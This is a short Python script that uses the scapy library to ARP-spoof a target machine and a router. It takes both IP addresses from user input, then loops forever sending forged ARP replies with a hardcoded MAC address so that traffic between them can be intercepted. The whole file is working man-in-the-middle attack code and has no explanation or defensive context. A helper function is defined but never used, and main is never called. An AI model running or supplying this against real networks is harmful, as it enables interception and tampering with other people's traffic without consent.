import scapy.all as sc
import time


def get_mac(ip):
    arp_request = sc.ARP(pdst=ip)
    broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    request_broadcast = broadcast/arp_request
    answered_list = sc.srp(request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    packet = sc.ARP(op=2, pdst=target_ip, hwdst="08:00:27:e6:e5:59", psrc=spoof_ip)
    sc.send(packet, verbose=False)


def main():
    sent_packets = 0

    try:
        target_ip = input("Enter the target IP: ")
        router_ip = input("Enter the IP of the router: ")
        while True:
            spoof(str(target_ip), str(router_ip))
            spoof(str(router_ip), str(target_ip))
            sent_packets = sent_packets + 2
            print("\r[*] Packets Sent ....... " + str(sent_packets), end="")
            time.sleep(2)
    except:
        print("\n\n..... Quitting!")